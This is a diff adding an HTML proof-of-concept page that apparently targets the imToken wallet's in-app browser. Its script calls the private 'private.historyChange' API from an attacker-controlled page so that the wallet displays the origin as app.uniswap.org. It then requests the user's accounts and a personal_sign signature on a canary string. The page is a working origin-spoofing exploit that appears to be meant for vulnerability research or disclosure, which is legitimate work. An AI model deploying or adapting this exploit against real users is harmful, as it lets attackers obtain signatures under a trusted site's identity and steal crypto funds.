@@ -1,0 +1,34 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>History-change origin binding probe</title>
+<style>
+body{font:16px system-ui;margin:18px;background:#10151c;color:#edf4ff}
+pre{white-space:pre-wrap;word-break:break-all;background:#1c2633;padding:12px;border-radius:8px}
+</style>
+<h2>History-change origin binding probe</h2>
+<p>This document remains at the attacker-controlled URL printed below.</p>
+<pre id="actual"></pre><pre id="state">Waiting for the injected provider…</pre>
+<script>
+actual.textContent=location.href;
+const sleep=ms=>new Promise(r=>setTimeout(r,ms));
+const hex=s=>'0x'+[...new TextEncoder().encode(s)].map(x=>x.toString(16).padStart(2,'0')).join('');
+async function run(){
+  while(!window.imToken?.callAPI || !window.ethereum?.request) await sleep(100);
+  state.textContent='Calling private.historyChange from '+location.origin;
+  imToken.callAPI('private.historyChange',{
+    url:'https://app.uniswap.org/swap',
+    title:'Uniswap',
+    loading:false,
+    canGoBack:false,
+    canGoForward:false
+  });
+  await sleep(800);
+  try{
+    const accounts=await ethereum.request({method:'eth_requestAccounts'});
+    state.textContent='Actual document: '+location.href+'\nRequesting a canary signature as '+accounts[0];
+    await ethereum.request({method:'personal_sign',params:[hex('imToken natural historyChange origin spoof canary'),accounts[0]]});
+  }catch(e){state.textContent+='\nResult: '+(e?.message||String(e))}
+}
+run();
+</script>
